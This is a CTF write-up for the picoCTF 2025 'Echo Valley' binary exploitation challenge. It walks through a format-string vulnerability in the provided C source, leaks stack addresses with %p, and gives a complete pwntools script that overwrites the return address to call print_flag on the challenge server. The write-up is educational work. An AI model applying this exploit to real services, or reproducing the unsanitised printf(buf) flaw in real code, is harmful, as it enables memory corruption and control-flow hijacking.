---
author: Viraj Singh
pubDatetime: 2025-03-24T19:08:54.705Z
modDatetime: 2025-03-24T19:08:54.705Z
title: picoCTF 2025 - Echo Valley
featured: true
draft: false
tags:
  - pwn
  - picoCTF 2025
  - picoCTF
  - medium
  - format string
description:
  A writeup for the PicoCTF 2025 binary exploitation challenge, Echo Valley.
---

## Table of contents

## Challenge Information

300 Points

Tags: Medium, picoCTF 2025, Binary Exploitation, browser_webshell_solvable

Author: Shuailin Pan (LeConjuror)

Description: 

The echo valley is a simple function that echoes back whatever you say to it. But how do you make it respond with something more interesting, like a flag?

Download the source: [valley.c](https://challenge-files.picoctf.net/c_shape_facility/3540df5468ae2357d00a7a3e2d396e6522b24f7a363cbaff8badcb270d186bda/valley.c)

Download the binary: [valley](https://challenge-files.picoctf.net/c_shape_facility/3540df5468ae2357d00a7a3e2d396e6522b24f7a363cbaff8badcb270d186bda/valley)

Connect to the service at `nc shape-facility.picoctf.net 59554`

Hint 1: Ever heard of a format string attack?

## Explanation

### Securities

Before we start we can look at the securities enabled using `checksec`:
```bash
└─$ checksec --file=valley
RELRO           STACK CANARY      NX            PIE             RPATH     
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH
```
\* I omitted irrelevant information from the `checksec` output

All of the important securities are enabled in this binary, so we will need to figure out a way to exploit this binary despite that. 
### Analyze the C file

We can start by analyzing the C source code.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```
The program does the following:
- Displays a welcome message and enters an interactive loop called "Echo Valley."
- In the loop, the user can:
    1. Input text, which is printed back with a prefix: "You heard in the distance: ".
    2. Type "exit" to exit the loop and print "The Valley Disappears."
    3. Type any other input, and it will be echoed back by the program.
- Contains a **format string vulnerability**:
    - The `printf(buf)` line does not sanitize the input, allowing potential exploitation via format string attacks (e.g., printing memory addresses or causing unintended behavior).
- The program exits after the user types "exit" or EOF is detected.

We are given a `print_flag` function which is defined but never called anywhere. We will likely need to use the format string vulnerability to call the `print_flag` function. 

Looking back at the `checksec` output, we can see that PIE or Position Independent Executable is enabled. Due to this, we will need to leak relevant addresses from the stack using the format string vulnerability and calculate addresses at runtime. 

## The Plan
Our goal is to ultimately overwrite the return address of the `echo_valley` function with the address of the `print_flag` function. 

1. We can leak the current return address of the `echo_valley` function and find the offset between that assembly instruction and the beginning of the `print_flag` function.
2. We can leak the saved EBP on the stack so we can calculate the stack address of the return address of the `echo_valley`
3. Finally, we can use the format string vulnerability with the following format specifiers
	- `%n`: Treats argument as a 4-byte integer
	- `%hn` : Treats argument as a 2-byte short integer. Overwrites only 2 significant bytes of the argument.
	- `%hhn` : Treats argument as a 1-byte char type. Overwrites the least significant byte of the argument.
## The Execution
### Step 1
Let's experiment with the program to try to leak the return address of the `echo_valley` function. We can input `"%p " * 30` to see if the return address was leaked.
Looking at the disassembly of main, 
```
0000000000001401 <main>:
    1401:	f3 0f 1e fa          	endbr64
    1405:	55                   	push   %rbp
    1406:	48 89 e5             	mov    %rsp,%rbp
    1409:	b8 00 00 00 00       	mov    $0x0,%eax
    140e:	e8 f4 fe ff ff       	call   1307 <echo_valley>
    1413:	b8 00 00 00 00       	mov    $0x0,%eax
    1418:	5d                   	pop    %rbp
    1419:	c3                   	ret
```
we can see that the return address of the `echo_valley` function should end with `0x413`.

Now, lets try running the program.
```
└─$ ./valley
Welcome to the Echo Valley, Try Shouting: 
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
You heard in the distance: 0x7fff0d375840 (nil) (nil) 0x564f3e80d70a 0x4 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70 (nil) 0x20b451e5d7f01600 0x7fff0d375a70 0x564f385ff413 0x1 0x7fad29518d68 0x7fff0d375b70 0x564f385ff401 0x1385fe040 0x7fff0d375b88 0x7fff0d375b88 0xc06b06d02c04c09 (nil)
```
Looking at the output, we can see that the 21st value returned, `0x564f385ff413`, ends with `0x413`. So we can input `%21$p` to only print the 21st value on the stack. 
```
└─$ ./valley
Welcome to the Echo Valley, Try Shouting: 
%21$p
You heard in the distance: 0x564d3f9bd413
```
Notice, that the value is different every time the executable is run since ASLR or Address Space Layout Randomization is enabled. This is why we need to leak this value from the stack. 

Now we need to find the offset between the current return address and the address of the `print_flag` function. 
```
0000000000001269 <print_flag>:
    1269:	f3 0f 1e fa          	endbr64
    126d:	55                   	push   %rbp
    126e:	48 89 e5             	mov    %rsp,%rbp
    ...
    12f8:	e8 f3 fd ff ff       	call   10f0 <fclose@plt>
    12fd:	bf 00 00 00 00       	mov    $0x0,%edi
    1302:	e8 69 fe ff ff       	call   1170 <exit@plt>
    
0000000000001401 <main>:
    1401:	f3 0f 1e fa          	endbr64
    1405:	55                   	push   %rbp
    1406:	48 89 e5             	mov    %rsp,%rbp
    1409:	b8 00 00 00 00       	mov    $0x0,%eax
    140e:	e8 f4 fe ff ff       	call   1307 <echo_valley>
    1413:	b8 00 00 00 00       	mov    $0x0,%eax
    1418:	5d                   	pop    %rbp
    1419:	c3                   	ret
```
Looking at this condensed `objdump` output, we can see that `print_flag` has an offset of `0x1269` and the current return address of the `echo_valley` function is `0x1413`.

Thus, the offset is: `0x1269-0x1413=-0x1AA` 

### Step 2
Now, we need to leak the saved EBP on the stack. Looking at this picture, we can see that the saved EBP is directly above the return address.
![Stack Frame Example](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0Jii-ufTp-kPHGUsMdowQyZVJ3wZW3m88J7u0CpSrONv3tNfsqL5lRr4y6XN_uX2H-ubqCFUkA3vusdvAkdzdpsEfLGAntb6ME0rWTI5fmgwfbDOYlSkjgChGimrI4gzZhC64oZWq/s320/mem.png)
Thus, we can simply do `%20$p` to leak the saved EBP.
```
└─$ ./valley
Welcome to the Echo Valley, Try Shouting: 
%20$p
You heard in the distance: 0x7fff506a2c80
```
Since the return address is the first value saved on the stack when a function is called, we can calculate the address of the return address by subtracting `0x8` from the leaked address. 
### Step 3
Now, we need to use the format string vulnerability to overwrite the return address with the address of the `print_flag` function. 

pwntools has a very useful function to perform exactly this. 
```
pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str
```
Parameters:
- **offset** – the first formatter’s offset you control
- **writes** – dict with addr, value `{addr: value, addr2: value2}`

Returns: The payload in order to do needed writes

To find the offset we can input some random text and then input some `%x` to see when we see out input on the stack.

```
└─$ ./valley
Welcome to the Echo Valley, Try Shouting: 
AAAAAAAA %p %p %p %p %p %p %p %p %p %p 
You heard in the distance: AAAAAAAA 0x7ffebcb80410 (nil) (nil) 0x5651c30c26d7 0x4 0x4141414141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa702520702520
```
We can see that our input, `AAAAAAAA` is the 6th value on the stack as `0x4141414141414141`.
Thus, we can do the following in python,
```python
payload = fmtstr_payload(6, {return_addr_stack_addr: print_flag_addr})
```
## Full Solution
```python
from pwn import *

# Set the context
context.binary = './valley'  
context.log_level = 'debug'

# Connect to remote
p = remote("shape-facility.picoctf.net",59554)

p.recvuntil(b'Welcome to the Echo Valley, Try Shouting: ')

# Leak the return address of the echo_valley function
p.sendline(b'%21$p')
p.recvuntil(b'You heard in the distance: ')
return_addr = p.recvline().decode()
log.info(f"Leaked return address: {return_addr}")
return_addr = int(return_addr, 16)

p.sendline(b'%20$p')
p.recvuntil(b'You heard in the distance: ')
saved_ebp = p.recvline().decode()
log.info(f"Leaked saved EBP: {saved_ebp}")
saved_ebp = int(saved_ebp,16)

# Calculate the address of print_flag
print_flag_offset = -0x1aa  # Offset of print_flag (from objdump)
print_flag_addr = return_addr + print_flag_offset
log.info(f"print_flag address: {hex(print_flag_addr)}")

# Calculate the stack address of the return address
return_addr_stack_addr = saved_ebp - 8
log.info(f"Return address stack address: {hex(return_addr_stack_addr)}")

# Craft the payload
payload = fmtstr_payload(6, {return_addr_stack_addr: print_flag_addr})  
p.sendline(payload)
p.sendlineafter(b'You heard in the distance: ', b'exit')

# Print the flag
print(p.recvall().decode('latin-1').split(" ")[-1])
```

## References 
- [Format String Explanation](https://fengweiz.github.io/20fa-cs315/labs/lab3-slides-format-string.pdf)
- [pwntools fmtstr Documentation](https://docs.pwntools.com/en/dev/fmtstr.html)
